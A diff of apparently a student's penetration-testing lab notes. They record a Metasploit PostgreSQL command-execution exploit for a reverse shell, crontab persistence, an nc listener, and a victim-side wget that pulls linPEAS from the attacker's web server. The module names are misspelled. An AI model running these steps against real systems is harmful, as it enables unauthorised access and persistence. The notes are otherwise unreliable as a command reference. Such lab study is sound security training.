@@ -10,13 +10,9 @@ say use zero, it's going to set set me up to utilize this module here.
 
 (ATK)(msf6) search postgresql [1:45:23][Day 11]
 Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0
-
 (ATK)(msf6) search postgresql 9.6.0 (start from 9.6.0 and back space one character each time to see what you find out)
-
 (ATK)(msf6) search postgresql 9.6
-
 (ATK)(msf6) search postgresql 9. [I USED 0 ON THIS]
-
 (ATK)(msf6) search postgresql 9
 
 use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
@@ -42,21 +38,14 @@ this will be for the report that enumeration was a dead end
 Config start around [1:48] [DAY 11]
 
 (CALI) searchsploit postgresql (find version) 
-
 (ATK)(msf6) search postgresql
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209 [3:29][DAY 11]
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [check config]
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [3:30][DAY 11]
 
 run id
-
 break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)
 
 (VICTIM) create a crontab using python3 shortest with your port number you want to use for VIC2 persistence
@@ -65,21 +54,20 @@ he set up another listner over port 12225 (VIC 2 Persisitence)
 
 catch user persistence shell ON VIC2 [[14:02]]DAY 12
 (ATTACKER) nc -lvp 55557 [NEW PORT I SET VIC ON PFSENSE]
-
 (ATTACKER) (NEW TERM) CAT INTERNAL AND CD TO 192.168.1.102
-
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh [1:33][DAY 12]
-
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh
-
 (ATTACKER) ls [this is a automation script that we will move to the victim] this info could be found on hacktricks
 (Checklist Linux Privesc escalation LinPEAS)
-
 (ATTACKER) python3 -m http.server 8000
-
-
 
 set up another port fowarding rule with this port number because thats where the websever is.
 
 (type in web browser) 127.0.0.1:8000 [use ip thats local to you]
 were going to download linPEAS to ourselves (ATTACKER) and then access it through the web server from the victim side. basically hosting linPeas utulizing python throwing up on a webpage and the downloading it from victim.
+
+(VICTIM) wget http://192.168.122.209:8000/linpeas.sh
+(VICTIM) mv linpeas.sh /tmp
+(VICTIM)cd /tmp
+(VICTIM)ls
+
